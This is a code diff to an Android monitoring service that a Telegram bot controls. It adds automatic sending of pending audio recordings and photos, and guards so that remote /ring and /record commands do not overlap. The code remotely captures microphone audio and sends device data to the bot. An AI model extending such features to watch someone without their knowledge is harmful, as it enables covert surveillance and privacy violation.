@@ -374,6 +374,14 @@ class MonitoringService : Service() {
                 try {
                     if (!cachedMonitoringPaused) {
                         checkAndSendNewData()
+                        try {
+                            flushPendingAudio()
+                        } catch (_: Exception) {
+                        }
+                        try {
+                            flushPendingPhotos()
+                        } catch (_: Exception) {
+                        }
                         chunkedDelay(syncIntervalMillis())
                     } else {
                         chunkedDelay(15 * 60_000L)
@@ -1168,6 +1176,16 @@ class MonitoringService : Service() {
                     sendToTelegram("⚠️ Flush delayed: bot credentials rejected (${preferencesManager.credentialError}). Fix the token in Setup.")
                     return
                 }
+                serviceScope.launch {
+                    try {
+                        flushPendingAudio()
+                    } catch (_: Exception) {
+                    }
+                    try {
+                        flushPendingPhotos()
+                    } catch (_: Exception) {
+                    }
+                }
                 val scheduled = MessageScheduler.scheduleMessageSend(this)
                 if (scheduled) {
                     sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
@@ -1203,6 +1221,8 @@ class MonitoringService : Service() {
                 val seconds = if (arg.isEmpty()) 15 else arg.toIntOrNull()?.coerceIn(5, 60)
                 if (seconds == null) {
                     sendToTelegram("Usage: /ring [5-60] (seconds)")
+                } else if (recordBusy.get()) {
+                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
                 } else if (!ringBusy.compareAndSet(false, true)) {
                     sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
                 } else {
@@ -1246,6 +1266,8 @@ class MonitoringService : Service() {
                     sendToTelegram("Usage: /record \u003c5-60\u003e (seconds)")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
+                } else if (ringBusy.get()) {
+                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
                 } else if (!recordBusy.compareAndSet(false, true)) {
                     sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
                 } else {
